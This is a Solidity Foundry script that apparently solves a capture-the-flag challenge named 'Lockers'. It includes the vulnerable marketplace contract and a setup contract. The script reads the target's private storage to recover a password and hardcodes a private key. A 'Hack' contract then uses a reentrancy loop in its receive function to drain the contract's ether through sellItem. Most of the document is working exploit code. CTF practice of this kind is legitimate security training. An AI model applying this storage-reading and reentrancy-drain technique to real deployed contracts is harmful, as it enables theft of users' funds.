// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import {Script, console} from "forge-std/Script.sol";

contract Solution is Script {
    Setup public setup = Setup(0x4D8CDD9F7EcBC52ba956015BdFa0f298b056400C);
    address wallet = 0x60b1a6d684F8f5F4905381EE4e438c368ee392cB;
    Lockers public target = setup.TARGET();

    function setUp() public {}

    function run() public {
        vm.startBroadcast(0x2eef128492e38c3acb0686196791bff1dc4456454b2d5db3a329c9905565f1c5);

        console.log(address(target).balance);

        uint256 len = uint256(vm.load(address(target), bytes32(uint256(3))));
        bytes32 startSlot = keccak256(abi.encode(uint256(3)));
        
        for(uint256 i = 18; i < 21; i++) {
            bytes32 tes = vm.load(address(target), bytes32(uint256(startSlot) + i));
            console.logBytes32(tes);
        }

        // string memory owner = string(vm.load(address(target), bytes32(uint256(startSlot) + 19)));

        target.getLocker("Nafiz", "Nafiz");
        target.putItem("Ebel", "Nafiz", 2);

        (string memory owner,) = target.viewItems("WizardsScepter");
        // string memory ownerr = abi.decode(owner, (string));

        // console.logString(owner);
        // bytes32 owner = 0x57697a617264735363657074657200000000000000000000000000000000001c;

        bytes32 passwordSlot = keccak256(abi.encodePacked(owner, uint256(0)));
        bytes32 passwordSlot_ = vm.load(address(target), passwordSlot);

        bytes32 password = vm.load(address(target), bytes32(uint256(keccak256(abi.encode(passwordSlot))) + 1));
        console.logBytes32(password); 

        // target.sellItem("WizardsScepter", "");
        Hack hack = new Hack(address(target));
        hack.attack();

        console.log(setup.isSolved());

        vm.stopBroadcast();
    }
}

// ss4#Nq7nNyKMfZ=XESnOzP2hk:SSRCzo2QPk4w~~
// 0x57697a617264735363657074657200000000000000000000000000000000001c
// 0x62656c6965667370616365000000000000000000000000000000000000000016

//  "PrivateKey": "0x2eef128492e38c3acb0686196791bff1dc4456454b2d5db3a329c9905565f1c5",
//     "Address": "0x60b1a6d684F8f5F4905381EE4e438c368ee392cB",
//     "TargetAddress": "0x0fc8486390408Da15D5E51308C003f9E0514F7a3",
//     "setupAddress": "0x4D8CDD9F7EcBC52ba956015BdFa0f298b056400C"


contract Hack {
    Lockers public target;

    constructor(address _target) {
        target = Lockers(_target);
    }

    function attack() external {
        target.getLocker("ABCD", "ABCD");
        target.transferItem("WizardsScepter", "ABCD", "ss4#Nq7nNyKMfZ=XESnOzP2hk:SSRCzo2QPk4w~~");
        target.sellItem("WizardsScepter", "ABCD");
    }

    receive() external payable {
        if(address(target).balance >= 1 ether) {
            target.sellItem("WizardsScepter", "ABCD");
        }
    }
}

contract Setup {
    Lockers public immutable TARGET;

    constructor(
        string[] memory _users,
        string[] memory _passwords,
        string[] memory _itemNames,
        string[] memory _itemOwners,
        uint8[] memory _itemRarities
    ) payable {
        require(msg.value > 2 ether);
        TARGET = new Lockers{value: 2 ether}(_users, _passwords, _itemNames, _itemOwners, _itemRarities);
    }

    function isSolved() public view returns (bool) {
        return address(TARGET).balance == 0;
    }
}

contract Lockers {
    enum Rarity {
        Common,
        Rare,
        Epic,
        Mythic
    }

    struct Item {
        string name;
        string owner;
        Rarity rarity;
    }

    mapping(string => string) private users;
    mapping(string => address) private usernameToWallet;
    mapping(Rarity => uint256) public price;
    Item[] private items;

    constructor(
        string[] memory _users,
        string[] memory _passwords,
        string[] memory _itemNames,
        string[] memory _itemOwners,
        uint8[] memory _itemRarities
    ) payable {
        require(_users.length == _passwords.length);
        require((_itemNames.length == _itemOwners.length) && (_itemOwners.length == _itemRarities.length));

        for (uint256 i; i < _users.length;) {
            users[_users[i]] = _passwords[i];
            unchecked {
                ++i;
            }
        }

        for (uint256 i; i < _itemNames.length;) {
            items.push(Item(_itemNames[i], _itemOwners[i], Rarity(_itemRarities[i])));
            unchecked {
                ++i;
            }
        }

        price[Rarity.Common] = 1;
        price[Rarity.Rare] = 10;
        price[Rarity.Epic] = 100;
        price[Rarity.Mythic] = 1000000000000000000;
    }

    function putItem(string calldata name, string calldata owner, uint8 rarity) external {
        require(rarity < 3);
        items.push(Item(name, owner, Rarity(rarity)));
    }

    function viewItems(string calldata _name) external view returns (string memory, Rarity) {
        for (uint256 i = 0; i < items.length; ++i) {
            if (_strEquals(_name, items[i].name)) {
                return (items[i].owner, items[i].rarity);
            }
        }
        revert("NoSuchItem");
    }

    function retrieveItem(string calldata name, string calldata password) external {
        for (uint256 i = 0; i < items.length; ++i) {
            if (_strEquals(name, items[i].name)) {
                require(_strEquals(password, users[items[i].owner]), "Authentication Failed");
                delete items[i];
                break;
            }
        }
    }

    function transferItem(string calldata name, string calldata to, string calldata password) external {
        for (uint256 i = 0; i < items.length; ++i) {
            if (_strEquals(name, items[i].name)) {
                require(_strEquals(password, users[items[i].owner]), "Authentication Failed");
                items[i].owner = to;
                break;
            }
        }
    }

    function sellItem(string calldata name, string calldata password) external {
        uint256 index;
        Item memory _item;
        string memory prevOwner;

        for (uint256 i = 0; i < items.length; ++i) {
            if (_strEquals(name, items[i].name)) {
                require(_strEquals(password, users[items[i].owner]), "Authentication Failed");
                _item = items[i];
                prevOwner = items[i].owner;
                index = i;
            }
        }

        require(bytes(_item.name).length > 0, "Item does not exist");

        _item.owner = "Vendor";

        (bool success,) = usernameToWallet[prevOwner].call{value: price[_item.rarity]}("");
        require(success);
        delete items[index];
    }

    function getLocker(string calldata username, string calldata password) external {
        require(bytes(users[username]).length == 0, "User already exists");
        require(!_strEquals(username, "Vendor"), "Only the true vendor can use this name!");
        users[username] = password;
        usernameToWallet[username] = msg.sender;
    }

    function _strEquals(string calldata _first, string memory _second) private pure returns (bool) {
        return keccak256(abi.encode(_first)) == keccak256(abi.encode(_second));
    }
}